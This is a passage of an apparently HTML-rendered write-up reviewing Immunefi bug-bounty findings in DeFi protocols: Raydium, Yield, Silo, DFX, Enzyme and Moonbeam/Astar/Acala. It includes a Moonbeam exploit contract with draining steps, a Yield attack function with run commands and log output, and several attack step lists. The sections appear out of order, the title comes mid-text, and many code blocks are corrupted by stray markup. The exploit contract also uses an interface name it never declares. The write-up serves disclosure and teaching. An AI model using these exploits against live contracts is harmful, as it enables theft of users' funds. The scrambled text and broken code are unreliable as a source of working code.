+<p>To address this issue, Enzyme introduced the following <a href="https://github.com/enzymefinance/protocol/commit/e813a20f36565feffb0f07993a730505c7949830">commit</a> to add the required check within the GasRelayPaymasterLib, which verifies if the passed address is a trusted forwarder and reverts otherwise.</p>
+<p>```diff
+    function preRelayedCall(
+        IGsnTypes.RelayRequest calldata <em>relayRequest,
+        bytes calldata,
+        bytes calldata,
+        uint256
+    )
+        external
+        override
+        relayHubOnly
+        returns (bytes memory context</em>, bool rejectOnRecipientRevert<em>)
+    {
++       require(
++           _relayRequest.relayData.forwarder == TRUSTED</em>FORWARDER,
++           "preRelayedCall: Unauthorized forwarder"
++       );</p>
+<pre><code>    address vaultProxy = getParentVault();
+    require(
+        IVault(vaultProxy).canRelayCalls(_relayRequest.request.from),
+        "preRelayedCall: Unauthorized caller"
+    );
+
+    bytes4 selector = __parseTxDataFunctionSelector(_relayRequest.request.data);
+    require(
+        __isAllowedCall(
+            vaultProxy,
+            _relayRequest.request.to,
+            selector,
+            _relayRequest.request.data
+        ),
+        "preRelayedCall: Function call not permitted"
+    );
+
+    return (abi.encode(_relayRequest.request.from, selector), false);
+}
+</code></pre>
+<p>```</p>
+<h1>6. Moonbeam, Astar, And Acala - Library Truncation</h1>
+<p>Reported by: @pwning.eth</p>
+<p>Protocol: Moonbeam, Astar Network, and Acala</p>
+<p>Date: June 27th, 2023</p>
+<p>Bounty: $1,000,000</p>
+<h3>TL;DR</h3>
+<p>In the Frontier pallet for Substrate, there's a vulnerability due to the truncation of <code>msg.value</code> from 256 bits to 128 bits in the <code>transfer</code> function. This causes smart contracts to mistakenly accept large values as valid when they are actually truncated to zero. An attacker can exploit this by creating and withdrawing from wrapper tokens as if they had deposited a large amount of value, leading to the potential draining of all wrapped tokens on the network. This can also affect DEXes by allowing attackers to drain tokens from them as well.</p>
+<h3>Vulnerability Analysis</h3>
+<p>The bug, which was found within Frontier — the Substrate pallet that provides core Ethereum compatibility features within the Polkadot ecosystem–impacted Moonbeam, Astar Network, and Acala.</p>
+<p>On Moonbeam, we have native tokens like <code>MOVR</code> and <code>GLMR</code> and their wrapped counterparts, like <code>WMOVR</code> and <code>WGLRM</code>. Likewise, on Astar, there is <code>Astar</code> and <code>Wrapped Astar</code>.</p>
+<p>The central issue was with how Frontier handled low-level EVM events:</p>
+<p>```rust
+    fn transfer(&amp;mut self, transfer: Transfer) -&gt; Result&lt;(), ExitError&gt; {
+        let source = T::AddressMapping::into<em>account</em>id(transfer.source);
+        let target = T::AddressMapping::into<em>account</em>id(transfer.target);</p>
+<pre><code>    T::Currency::transfer(
+        &amp;source,
+        &amp;target,
+</code></pre>
+<p>@&gt;          transfer.value.low<em>u128().unique</em>saturated<em>into(),
+            ExistenceRequirement::AllowDeath,
+        )
+        .map</em>err(|_| ExitError::OutOfFund)
+    }
+```</p>
+<p>In the above code snippet, we notice in <code>transfer</code> that the <code>msg.value</code> is reduced (or truncated) from 256 bits to 128 bits. This seemingly innocuous oversight might result in a serious discrepancy between the runtime and the EVM environment.</p>
+<p>What is truncation? In simplest terms, truncation means to cut off a portion of the number. If we do decimal truncation of 9.8, we would cut off 0.8 and we would be left with 9. In bit truncation, we truncate the higher bits of a number. For example, truncating a 32 bit number to 16 bits would result in higher-end bits being cut off and only the lower 16 bits staying.</p>
+<p>65539 (32 bit) to 16 bit would result in the number 3. Why?</p>
+<p>65539 is 10000000000000011 in binary. As it only takes 17 bits to hold that number, we only leave with the lower 16 bits (counting from right), and we are left with 0000000000000011, which is 3.</p>
+<p>What does this all mean in the context of the bug? Smart contracts believe that the huge 256 bit <code>msg.value</code> is valid, although the actual transfer never happens, as the truncated value will be zero, even though we passed in <code>msg.value</code> <code>2¹²⁸</code>.</p>
+<p>In reality, we won’t be transferring any native tokens, due to this error. However, smart contracts that accept <code>msg.value</code> as though it were in 256 bit format (wrapper contracts, for example), will think we transferred <code>2¹²⁸</code>!</p>
+<p>With this trick, we could create as many wrapper tokens as we wanted to and later withdraw everything from wrapper contracts. This would drain every wrapped token on the network.</p>
+<p>But that’s not all. With DEXes accepting native transfer of tokens to swap to any other token, we could also drain all DEXes on such a network.</p>
+<p>To illustrate the above, here is a sample contract to exploit the bug:</p>
+<p>```solidity
+// SPDX-License-Identifier: GPL-3.0</p>
+<p>pragma solidity &gt;=0.8.0;</p>
+<p>interface IWETH {
+    function deposit() external payable;
+    function withdraw(uint wad) external;
+}</p>
+<p>contract Exploit {
+    IWMOVR private wmovr;</p>
+<pre><code>constructor(address _wmovr) {
+    wmovr = IWMOVR(_wmovr);
+}
+
+function depositWMOVR() payable external {
+    uint256 val = msg.value + (1 &lt;&lt; 128);
+    wmovr.deposit{value: val}();
+}
+
+function withdrawMOVR(uint256 amount) external {
+    wmovr.withdraw(amount);
+}
+
+function balance() public view returns (uint256) {
+    return address(this).balance;
+}
+
+fallback() external payable {}
+</code></pre>
+<p>}
+```</p>
+<p>A step-by-step guide for understanding how the exploit works practically:</p>
+<ol>
+<li>Deploy the above exploit contract onto the Moonbeam network with the address of the Wrapped MOVR contract.</li>
+<li>Call <code>depositWMOVR()</code> function with <code>msg.value=0</code>. The <code>val</code> will be evaluated into <code>2¹²⁸ + 0</code>. This will mean that during the deposit into <code>WMOVR</code>, we won’t be transferring any <code>MOVR</code> as it will be truncated to <code>0</code>.</li>
+<li>Call <code>withdrawMOVR()</code>. The <code>WMOVR</code> contract will think we deposited <code>2¹²⁸</code> in the previous step thus allowing us to get <code>2¹²⁸</code> <code>MOVR</code> by only paying for the transaction fees!</li>
+<li>Profit.</li>
+</ol>
+<h3>Vulnerability Fix</h3>
+<p>Moonbeam released a new Runtime 1606 which addressed the issue by removing the truncation. More information about the fix can be found <a href="https://moonbeam.network/news/moonbeam-team-releases-urgent-security-patch-for-integer-truncation-bug">here</a> in their security announcement.</p>
+<p>As Moonbeam is also one of the maintainers of the library, they released a <a href="https://github.com/moonbeam-foundation/frontier/compare/652abf16...ca027df5">bug fix</a>.</p>
+<h2>References</h2>
+<p>[1]. https://medium.com/immunefi/raydium-tick-manipulation-bugfix-review-c6aae4527ed6</p>
+<p>[2]. https://medium.com/immunefi/yield-protocol-logic-error-bugfix-review-7b86741e6f50</p>
+<p>[3]. https://medium.com/immunefi/silo-finance-logic-error-bugfix-review-35de29bd934a</p>
+<p>[4]. https://medium.com/immunefi/dfx-finance-rounding-error-bugfix-review-17ba5ffb4114</p>
+<p>[5]. https://medium.com/immunefi/enzyme-finance-missing-privilege-check-bugfix-review-ddb5e87b8058</p>
+<p>[6]. https://medium.com/immunefi/moonbeam-astar-and-acala-library-truncation-bugfix-review-1m-payout-41a862877a5b</p>
+<h2>Contact</h2>
+<p>For questions or suggestions, please contact <a href="https://x.com/tpiliposian">me</a>.</p>
+<p>Tigran Piliposyan</p>
+<html><head><meta content="https://github.com/tpiliposian/Immunefi_bugfixes/blob/main/immunefi.md" name="source"/><meta content="https://github.com/tpiliposian/Immunefi_bugfixes/blob/main/immunefi.md" name="url"/><meta content="Immunefi Bug Fixes" name="title"/><meta content="Immunefi Bug Fixes
+This repository documents research on critical bug fixes identified on Immunefi in 2023-2024, highlighting how these vulnerabilities were exploited, their impact on projects, and th" name="text"/></head><body><div style="background-color: #f0f0f0; padding: 10px; margin-bottom: 20px;">Source: https://github.com/tpiliposian/Immunefi_bugfixes/blob/main/immunefi.md</div><h1>Immunefi Bug Fixes</h1>
+<p>This repository documents research on critical bug fixes identified on Immunefi in 2023-2024, highlighting how these vulnerabilities were exploited, their impact on projects, and the subsequent fixes implemented. The goal is to provide insights into common pitfalls, remediation strategies, and lessons learned from real-world bug bounty reports.</p>
+<h1>1. Raydium - Tick Manipulation</h1>
+<p>Reported by: @riproprip</p>
+<p>Protocol: Raydium</p>
+<p>Date: January 10, 2024</p>
+<p>Bounty: $505,000 in RAY tokens</p>
+<h3>TL;DR</h3>
+<p>The vulnerability in Raydium's <code>increase_liquidity</code> function allowed attackers to manipulate liquidity at arbitrary price points by exploiting the <code>tickarray_bitmap_extension</code>. The function failed to verify if the account used for this extension was correct, letting attackers misuse it to "flip" tick statuses and perform unauthorized liquidity operations. This manipulation could significantly impact the pool's integrity and lead to financial loss. The fix involved adding a validation step to ensure the correct <code>TickArrayBitmapExtension</code> account is used, preventing these unauthorized actions.</p>
+<h3>Vulnerability Analysis</h3>
+<p>Raydium is an AMM with an integrated central order book system. Users can provide liquidity, perform swaps on the exchange, and stake the RAY token for additional yield. A fundamental aspect of Raydium is the Concentrated Liquidity Market Maker (CLMM).</p>
+<p>The vulnerability was located within the <a href="Raydium/increase_liquidity.rs">increase_liquidity</a> file of the Raydium protocol. It conducts several critical operations, including pool status validation, token amount calculations based on user-provided maximums, fee updates, and the actual increase of liquidity in the position’s state.</p>
+<p>Ticks represent discrete price points in a CLMM. By defining a range with tick<em>lower and tick</em>upper, an LP specifies the boundaries within which their liquidity will be active.</p>
+<p>The flaw was specifically in the conditional handling of the <a href="https://github.com/tpiliposian/Immunefi_bugfixes/blob/bde6c3486e58d91fff972cbdb12b8c4d56f2327f/Raydium/increase_liquidity.rs#L291">tickarray<em>bitmap</em>extension</a>:</p>
+<p>```rust
+let use<em>tickarray</em>bitmap<em>extension = pool</em>state.is<em>overflow</em>default<em>tickarray</em>bitmap(vec![tick<em>lower, tick</em>upper]);</p>
+<p>[...]</p>
+<p>if use<em>tickarray</em>bitmap<em>extension {
+    Some(&amp;remaining</em>accounts[0])
+} else {
+    None
+}
+```</p>
+<p>The <code>tickarray_bitmap_extension</code> is crucial in managing the pool’s pricing at extreme boundaries (very high or low prices). It also acts as an extended index to manage a larger range of price ticks which helps track which ticks have been initialized (i.e., have non-zero liquidity) beyond the default capacity of the system. The conditional logic decides whether an account from <code>remaining_accounts</code> is needed for the operation. This account is presumably related to handling the tick array bitmap extension. This function is designed to increase liquidity in a specific position within a liquidity pool using the remaining_accounts vector.</p>
+<p><code>remaining_accounts</code> is a vector containing all accounts passed into the instruction but not declared in the Accounts struct. This is useful when you want your function to handle a variable amount of accounts, e.g. when initializing a game with a variable number of players.</p>
+<p>The vulnerability arises because the function fails to verify whether <code>remaining_accounts[0]</code> is the accurate <code>TickArrayBitmapExtension</code> account linked to the current state of the pool. This oversight permits an attacker to execute liquidity operations at arbitrary price boundaries as described in the vulnerability demonstration section below.</p>
+<h3>Steps of the Attack:</h3>
+<ul>
+<li>Create a Secondary Pool: The attacker sets up a secondary pool.</li>
+<li>Target a Tick: They open a position at a specific tick they want to exploit in the primary pool.</li>
+<li>Zero Out and Manipulate Liquidity: They reduce the liquidity at this tick to zero and then increase it in a way that incorrectly uses the tickarray_bitmap of the primary pool.</li>
+</ul>
+<p>This manipulation lets the attacker “flip” a tick’s status in the bitmap. Transactions that should have adjusted liquidity at certain prices bypass these checks, allowing unauthorized liquidity increases.</p>
+<p>To clarify the exploit process using a practical example, consider price points A, B, and C, with A &lt; B &lt; C and both A and B within the lower range of the <code>bitmap_array</code>.
+The steps to exploit the vulnerability are as follows:
+1. Identify a victim pool.
+2. Execute a swap to shift the price to just above point A (A+1).
+3. Create liquidity within the price range B to C.
+4. Perform a swap across B without crossing C, which adds liquidity to the pool state due to the manipulated <code>tickarray_bitmap</code>.
+5. Execute the described attack to switch the <code>tickarray_bitmap</code> status at B to DISABLED, allowing a swap at A+1 to skip over B without affecting liquidity.
+6. Repeat the attack to re-enable the <code>tickarray_bitmap</code> at B.
+7. Perform another swap over B without crossing C, effectively doubling the liquidity erroneously.
+8. This process can be repeated as many times as desired to amass an excessive amount of liquidity.
+9. Following this procedure, swaps directed towards C will yield disproportionately high amounts of Token A, indicating the vulnerability has been fully exploited.
+10. If the goal is to acquire Token B, the process can be replicated at the higher end of the price spectrum.
+The core issue is the ability to “flip” a tick’s status within the tickarray_bitmap, allowing liquidity to be added without proper checks. This leads to significant discrepancies in liquidity management and compromises the integrity of the liquidity pool.</p>
+<h3>Vulnerability Fix</h3>
+<p>The correction involved adding a security check to ensure the correct application of the <code>tickarray_bitmap_extension</code>:</p>
+<p><code>rust
+if use_tickarray_bitmap_extension {
+    require_keys_eq!(
+        remaining_accounts[0].key(),
+        TickArrayBitmapExtension::key(pool_state_loader.key())
+    );
+    Some(&amp;remaining_accounts[0])
+} else {
+    None
+}
+</code></p>
+<p>This <a href="https://github.com/raydium-io/raydium-clmm/commit/83b5a471f2323fcac3848addab725b95e09ddeb8?source=post_page-----c6aae4527ed6--------------------------------">fix</a> introduces a validation step to confirm that the <code>remaining_accounts[0]</code> is the correct <code>TickArrayBitmapExtension</code> account associated with the pool’s current state.
+This ensures the proper handling of liquidity operations involving extreme price boundaries, thereby preventing the exploitation of this vulnerability in the future.</p>
+<h1>2. Yield Protocol - Logic Error</h1>
+<p>Reported by: @Paludo0x</p>
+<p>Protocol: Yield</p>
+<p>Date: April 28th, 2023</p>
+<p>Bounty: $95,000 USDC</p>
+<h3>TL;DR</h3>
+<p>The vulnerability in the Yield Protocol's strategy contract arises from the <code>burn()</code> function, which calculates the LP tokens to return to the user based on the current balance of LP tokens in the contract (<code>pool.balanceOf(address(this))</code>). An attacker can inflate this balance by sending extra LP tokens to the contract before calling burn, allowing them to withdraw more tokens than they originally deposited, effectively stealing from the protocol.</p>
+<h3>Vulnerability Analysis</h3>
+<p>Yield Protocol is a DeFi protocol that enables fixed-rate, fixed-term loan options between borrowers and lenders.</p>
+<p>The protocol facilitates these transactions via <code>fyTokens</code> (fixed yield tokens), a type of <code>ERC-20</code> token that can be exchanged one-to-one for an underlying asset upon reaching a predetermined maturity date.</p>
+<p>The vulnerability is associated with the <a href="https://arbiscan.io/address/0x5aeB4EFaAA0d27bd606D618BD74Fe883062eAfd0#code">strategy contract</a> of the protocol, which enables liquidity providers to deposit combined liquidity to a <code>YieldSpace</code> Pool.</p>
+<p>By depositing funds into the strategy contract, liquidity providers can mint strategy tokens. The amount of strategy tokens they receive corresponds proportionately to their deposit amount, allowing them to burn and redeem the LP tokens as well as any gain in fees/interest later.</p>
+<p>This vulnerability is associated with the burning shares functionality <code>burn(address to)</code> of the strategy contract which is responsible for burning the strategy tokens and allowing the user to withdraw the LP tokens:</p>
+<p>```solidity
+    function burn(address to)
+        external
+        isState(State.INVESTED)
+        returns (uint256 poolTokensObtained)
+    {
+        // Caching
+        IPool pool_ = pool;
+        uint256 poolCached_ = poolCached;
+        uint256 totalSupply_ = _totalSupply;</p>
+<pre><code>    // Burn strategy tokens
+    uint256 burnt = _balanceOf[address(this)];
+    _burn(address(this), burnt);
+
+    poolTokensObtained = pool.balanceOf(address(this)) * burnt / totalSupply_;
+    pool_.safeTransfer(address(to), poolTokensObtained);
+
+    // Update pool cache
+    poolCached = poolCached_ - poolTokensObtained;
+}
+</code></pre>
+<p>```</p>
+<p>Initially, the contract’s strategy tokens are burned. Then, the amount of liquidity pool tokens to be acquired are calculated based on the LP tokens contained in the strategy contract and are transferred to the designated address.</p>
+<p>The pool tokens to be returned to the caller are calculated by:</p>
+<p><code>solidity
+poolTokensObtained = pool.balanceOf(address(this)) * burnt / totalSupply_;
+</code></p>
+<p>This calculation is based on the LP tokens balance of the current strategy contract which could be inflated by sending the pool tokens directly to it.</p>
+<p>The attacker has control over <code>pool.balanceOf(address(this))</code>, which allows them to inflate the pool tokens returned, by transferring a specific amount of pool tokens directly to the strategy contract before burning the strategy shares tokens.</p>
+<p>As the pool tokens remain within the Strategy contract, the attacker making the call can mint the share tokens and then burn them back to retrieve the pool tokens that were utilized to inflate the calculation.</p>
+<p>This is done by the call to <code>mint()</code> function to get the strategy share tokens then the call to <code>burn()</code> function again to get back the LP tokens that were transferred.</p>
+<h3>PoC:</h3>
+<ul>
+<li>Clone the Immunefi bugfix review repository: <code>git clone https://github.com/immunefi-team/bugfix-reviews-pocs.git</code></li>
+<li>Run <code>forge test -vvv --match-path ./test/YieldProtocol/AttackTest.t.sol</code></li>
+</ul>
+<p>Attack function:</p>
+<p>```solidity
+    function _executeAttack() internal {
+        console.log("\n&gt;&gt;&gt; Execute attack\n");</p>
+<pre><code>    //burning of strategy tokens
+    uint256 tokensBurnt = strategyYSDAI6MMS.burn(ada);
+
+    //burning remaing part of LP tokens sent to strategy
+    strategyYSDAI6MMS.mint(address(strategyYSDAI6MMS));
+    strategyYSDAI6MMS.burn(ada);
+
+    //retrieving and converting all tokens to base token
+    FYDAI2309LPArbitrum.transfer(address(FYDAI2309LPArbitrum), FYDAI2309LPArbitrum.balanceOf(ada));
+    FYDAI2309LPArbitrum.burnForBase(ada,0,type(uint128).max); // get fyToken to the ADA
+    FYDAI2309LPArbitrum.retrieveBase(ada); // get DAI stored on the contract to the ADA
+    FYDAI2309LPArbitrum.retrieveFYToken(ada);  // get fyToken stoeed on the contract to the ADA.
+
+    console.log("Tokens Burnt : ",tokensBurnt);
+
+    _completeAttack();
+
+}
+</code></pre>
+<p>```</p>
+<p>Log output:</p>
+<p>```
+Ran 1 test for test/YieldProtocol/AttackTest.t.sol:AttackTest
+[PASS] testAttack() (gas: 677227)
+Logs:</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>Initiate attack</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>Tokens Obtained :  20916988492243432153263</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>Execute attack</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>Tokens Burnt :  32081082781615545896437</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>Attack complete</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>holder gain in base wei :  11096784340278200659569
+  pool gain in base wei :  -11096784340278200659569
+  Strategy gain in base wei :  0
+  holder gain in FYToken :  0
+  pool gain in FYToken :  0
+  Strategy gain in FYToken :  0
+  holder gain in LPToken :  0
+  pool gain in LPToken :  0
+  Strategy gain in LPToken :  -11164094289372113743173
+  Pool base token amount before transactions: 1.3330628639753853259506e22
+  Pool base token amount after transactions: 2.233844299475652599937e21
+  holder base token amount before transactions: 1e24
+  holder base token amount after transactions: 1.011096784340278200659569e24</p>
+<p>Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.61s (6.15s CPU time)
+```</p>
+<h3>Vulnerability Fix</h3>
+<p>In the patch, the project team modified the <code>burn()</code> function in the strategy contract to use <code>poolCached_</code> instead of <code>pool.balanceOf(address(this))</code> to determine the number of LP tokens that should be transferred to the caller, fixing the issue.</p>
+<p>The new formula would be:</p>
+<p><code>solidity
+poolTokensObtained = poolCached_ * burnt / totalSupply_;
+</code></p>
+<h1>3. Silo Finance - Logic Error</h1>
+<p>Reported by: @kankodu</p>
+<p>Protocol: Silo Finance</p>
+<p>Date: April 28th, 2023</p>
+<p>Bounty: $100,000 USDC</p>
+<h3>TL;DR</h3>
+<p>A vulnerability in the Base Silo contract of Silo Finance allowed attackers to manipulate the utilization rate and interest calculations by donating assets to markets with zero initial deposits. By becoming the majority shareholder and manipulating the utilization rate, attackers could inflate interest rates and borrow disproportionately high amounts of funds. The temporary fix involved depositing assets to prevent zero deposits, and the permanent fix capped utilization rates at 100% and limited maximum interest rates. Formal verification by Certora confirmed these fixes were effective against similar exploits.</p>
+<h3>Vulnerability Analysis</h3>
+<p>The whitehat reported the vulnerability in the <a href="https://github.com/silo-finance/silo-core-v1/blob/master/contracts/BaseSilo.sol">Base</a> Silo contract which is responsible for handling the core logic of the lending protocol. The Silo contract is a lending protocol which allows users to deposit collateral asset tokens to the contract by calling the <code>deposit()</code> function of the contract. In return, the contract mints the share of tokens to the depositor based on the deposited amount and the total supply of the share and updates the storage state <code>_assetStorage[_asset]</code> with the deposited amount:</p>
+<p>```solidity
+       AssetStorage storage <em>state = _assetStorage[</em>asset];</p>
+<pre><code>   collateralAmount = _amount;
+
+
+   uint256 totalDepositsCached = _collateralOnly ? _state.collateralOnlyDeposits : _state.totalDeposits;
+
+
+   if (_collateralOnly) {
+       collateralShare = _amount.toShare(totalDepositsCached, _state.collateralOnlyToken.totalSupply());
+       _state.collateralOnlyDeposits = totalDepositsCached + _amount;
+       _state.collateralOnlyToken.mint(_depositor, collateralShare);
+   } else {
+       collateralShare = _amount.toShare(totalDepositsCached, _state.collateralToken.totalSupply());
+       _state.totalDeposits = totalDepositsCached + _amount;
+       _state.collateralToken.mint(_depositor, collateralShare);
+   }
+</code></pre>
+<p>``<code>
+The users who deposit the collateral in the contract can borrow other assets from the protocol by using the</code>borrow()` function, which updates the accrued interest rate of the borrowing asset first and then checks to see if the current contract has enough tokens for the user to borrow. Then, the function transfers the tokens to the user and checks the loan-to-value (LTV) ratio based on the collateral provided.</p>
+<p>```solidity
+   function <em>borrow(address _asset, address _borrower, address _receiver, uint256 _amount)
+       internal
+       nonReentrant
+       returns (uint256 debtAmount, uint256 debtShare)
+   {
+       // MUST BE CALLED AS FIRST METHOD!
+       _accrueInterest(</em>asset);</p>
+<pre><code>   if (!borrowPossible(_asset, _borrower)) revert BorrowNotPossible();
+
+
+   if (liquidity(_asset) &lt; _amount) revert NotEnoughLiquidity();
+</code></pre>
+<p>/// @inheritdoc IBaseSilo
+   function liquidity(address <em>asset) public view returns (uint256) {
+       return ERC20(</em>asset).balanceOf(address(this)) - <em>assetStorage[</em>asset].collateralOnlyDeposits;
+   }
+```</p>
+<p>On a high level, the vulnerability allows an attacker to manipulate the utilization rate of an asset that had zero total deposit to the contract. An attacker can manipulate the utilization rate by donating an ERC20 asset to the contract, and if the attacker had the majority of the shares in the market for that particular asset, borrowing the donated token would inflate the utilization rate of that particular asset. In general, the steps to reproduce this attack:</p>
+<ol>
+<li>Determine a market that had 0 total deposits for one of the assets in the market. For example, WETH had 0 total deposits.</li>
+<li>Become the majority shareholder for that particular asset by depositing WETH to that market, which will make the <code>totalDeposits</code> for that asset non-zero.</li>
+<li>Donate additional WETH to the market, which will allow other users to borrow more WETH than the total deposited WETH, on step 2.</li>
+<li>Use another user/address to deposit another asset in the market, to borrow the donated WETH.</li>
+<li>In the next block, if <code>accrueInterest()</code> is called, the utilization rate of the attacker's initial deposited amount will be over 100%, which will increase the interest rate to an extremely high value.</li>
+<li>Because of this inflated interest rate, the attacker’s initial deposit is valued more than it should be, and it allows the attacker to borrow most of the funds in the market.</li>
+</ol>
+<p><code>solidity
+   /// @inheritdoc IBaseSilo
+   function liquidity(address _asset) public view returns (uint256) {
+       return ERC20(_asset).balanceOf(address(this)) - _assetStorage[_asset].collateralOnlyDeposits;
+   }
+</code></p>
+<h3>PoC</h3>
+<p>The steps to use this POC is as follows:</p>
+<ol>
+<li>Install https://github.com/foundry-rs/foundry</li>
+<li>Replace <code>Counter.sol</code> with <a href="SiloFinance/BugFixReview.sol">BugFixReview.sol</a></li>
+<li>Replace <code>Counter.t.sol</code> with <a href="SiloFinance/BugFixReview.t.sol">BugFixReview.t.sol</a></li>
+<li>Run <code>forge test — match-path test/BugFixReview.t.sol -vvv</code></li>
+</ol>
+<p>This POC will make a local fork on 17139470 and 17139471 and will try to manipulate the interest rate on the first block before stealing funds on the second block. Since the attack occurs over two blocks, we can’t use a flashloan to demonstrate the attack.</p>
+<p>What we can do instead is to use deal from Forge to manipulate the attacker contract balance.</p>
+<h3>Vulnerability Fix</h3>
+<p>The project temporarily fixed the vulnerable market after the report was submitted, and after the proper fix is ready, the code is deployed to the mainnet.</p>
+<p>The first mitigation that the project implemented was to deposit an asset to the market that had 0 total deposits in the market, which can be seen in this transaction.</p>
+<p>However, this deposit only mitigated the vulnerable market temporarily. For the permanent fix, the project implemented a cap in the utilization rate calculation and limited the maximum compounded interest rate to 10k % APR. The former one is to make sure that the utilization rate never exceeds 100% of utilization rate. And the latter is to stop producing yield after compounded interest passes 10%, unless <code>accrueInterest()</code> is being called.</p>
+<p>To make sure the fixes that the project implemented are secure and didn’t leave any edge cases, the code went through formal verification from Certora, with added rules that cover this vulnerability. Those rules are:</p>
+<p><code>cantExceedMaxUtilization</code> and <code>interestNotMoreThenMax</code>.</p>
+<ul>
+<li><code>cantExceedMaxUtilization</code> is an invariant that guarantees that the utilization rate never exceeds 100%. This means that no one can borrow more than the deposited amount.</li>
+<li><code>interestNotMoreThenMax</code> tests the fixes to make sure that the interest rate cannot exceed the max limit.</li>
+</ul>
+<p>The details for both of these rules/specs were already published by the project, which you can access in their <a href="https://github.com/silo-finance/silo-core-v1/blob/e5d16f201ab2139829d45ed881532c936249d3a5/certora/specs/interest-rate-model/CertoraInterestRate.spec#L4-L46">Github</a>.</p>
+<p>The permanent fix can be seen at <a href="https://etherscan.io/address/0x76074C0b66A480F7bc6AbDaA9643a7dc99e18314#code">this address</a>.</p>
+<p>For further information regarding the fixes that Silo Finance and Certora made to fix this vulnerability, you can read <a href="https://medium.com/silo-protocol/vulnerability-disclosure-2023-06-06-c1dfd4c4dbb8">here</a> and <a href="https://medium.com/certora/silo-finance-post-mortem-3b690fffeb08">here</a>.</p>
+<h1>4. DFX Finance - Rounding Error</h1>
+<p>Reported by: @perseverance</p>
+<p>Protocol: DFX Finance</p>
+<p>Date: April 28, 2023</p>
+<p>Bounty: $100,000 USDT</p>
+<h3>TL;DR</h3>
+<p>A vulnerability in DFX Finance’s AssimilatorV2 contract allowed users to exploit the token transfer calculation when using EURS tokens, which have fewer decimals than most tokens. By repeatedly depositing small amounts that resulted in zero tokens being transferred, attackers could still receive minted curve tokens representing pool shares. This allowed attackers to progressively take over the pool without providing corresponding liquidity. DFX Finance fixed the issue by requiring that the transferred amount is greater than zero before allowing the transaction.</p>
+<h3>Vulnerability Analysis</h3>
+<p>DFX Finance is a decentralized foreign exchange (FX) protocol. DFX Finance creates a decentralized marketplace where users can swap non-USD stablecoins pegged to various foreign currencies, such as CADC, EUROC, XSGD, and more. These types of exchanges also typically incentivize liquidity providers to supply capital by offering yield on funds deposited. The design uses an automated market making mechanism (AMM) to allow the exchange to operate in a decentralized way. The AMM exchanges tokens according to a <a href="https://yos.io/2018/11/10/bonding-curves/">bonding curve</a>, which is dynamically adjusted according to real world price feeds from Chainlink. Each currency is paired with USDC, which is treated as a bridge currency in the DFX AMM between all other stablecoins.</p>
+<p>Assimilators are necessary when dealing with pairs of different values, which is core to DFX protocol as all assets are paired with USDC. The <a href="https://github.com/dfx-finance/protocol-v2/blob/main/src/assimilators/AssimilatorV2.sol">AssimilatorV2</a> contract is responsible for converting all amounts to a numeraire, or a base value used for computations across the protocol. DFX Finance maintains the assimilators which integrate with Curve to provide proportional liquidity to pools. When users would like to provide liquidity to a pool to receive yield on their stablecoins, they call the deposit function on the <a href="DFXFinance/Curve.sol">Curve pool</a> and receive liquidity provider tokens in return representing their proportion of the underlying asset they deposited.</p>
+<p>When a user deposits EURS, the function checks if the deposit amount is greater than zero, and then delegates most of the logic to the library call <code>ProportionalLiquidity.proportionalDeposit</code>.</p>
+<p>Within the <code>proportionalDeposit()</code> function, the curve pool calls to the <code>AssimilatorV2</code> contract <code>intakeNumeraireLPRatio</code> to calculate the corresponding amount of euros to transfer from the user, which is calculated on line 145, based on the LP ratio passed to the function:</p>
+<p>```solidity
+// takes a numeraire amount, calculates the raw amount of eurs, transfers it in and returns the corresponding raw amount
+function intakeNumeraireLPRatio(
+    uint256 <em>baseWeight,
+    uint256 _minBaseAmount,
+    uint256 _maxBaseAmount,
+    uint256 _quoteWeight,
+    uint256 _minQuoteAmount,
+    uint256 _maxQuoteAmount,
+    address _addr,
+    int128 _amount
+) external override returns (uint256 amount</em>) {
+    uint256 <em>tokenBal = token.balanceOf(</em>addr);</p>
+<pre><code>if (_tokenBal &lt;= 0) return 0;
+
+_tokenBal = _tokenBal.mul(1e18).div(_baseWeight);
+
+uint256 _usdcBal = usdc.balanceOf(_addr).mul(1e18).div(_quoteWeight);
+
+// Rate is in 1e6
+uint256 _rate = _usdcBal.mul(10**tokenDecimals).div(_tokenBal);
+
+amount_ = (_amount.mulu(10**tokenDecimals) * 1e6) / _rate;
+
+if (address(token) == address(usdc)) {
+    require(amount_ &gt;= _minQuoteAmount &amp;&amp; amount_ &lt;= _maxQuoteAmount, "Assimilator/LP Ratio imbalanced!");
+} else {
+    require(amount_ &gt;= _minBaseAmount &amp;&amp; amount_ &lt;= _maxBaseAmount, "Assimilator/LP Ratio imbalanced!");
+}
+token.safeTransferFrom(msg.sender, address(this), amount_);
+</code></pre>
+<p>}
+```</p>
+<p>After the transfer of the deposit is handled in the <code>intakeNumeraireLPRatio()</code> function and liquidity is transferred from the user to the contract, the <code>proportionalDeposit()</code> function mints the number of LP tokens which represents the users’ share of the pool. Finally, the deposit function returns the value of deposits and shares minted:</p>
+<p>```solidity
+function proportionalDeposit(...)
+    external
+    returns (uint256 curves<em>, uint256[] memory)
+{
+    ...
+    require(</em>newShells &gt; 0, "Proportional Liquidity/can't mint negative amount");
+    mint(curve, msg.sender, curves_ = _newShells.mulu(1e18));</p>
+<pre><code>return (curves_, deposits_);
+</code></pre>
+<p>}
+```</p>
+<p>DFX Finance’s contracts contained a vulnerability that stemmed from the calculation of the transfer amount within the <code>AssimilatorV2</code> contract on <a href="https://github.com/dfx-finance/protocol-v2/blob/main/src/assimilators/AssimilatorV2.sol#L145">line 145</a>. The issue arises when the <code>_rate</code> exceeds the numerator value, resulting in an integer division that leads to zero tokens being transferred from the user. Despite transferring zero tokens, the user still receives curve tokens which represent their portion of the curve pool. To exploit this, an attacker would deposit a minuscule amount of tokens, causing the transferred amount to be zero while still receiving minted curve tokens in exchange for the small proportion of tokens “deposited”:</p>
+<p><code>solidity
+// Rate is in 1e6
+uint256 _rate = _usdcBal.mul(10**tokenDecimals).div(_tokenBal);
+</code>
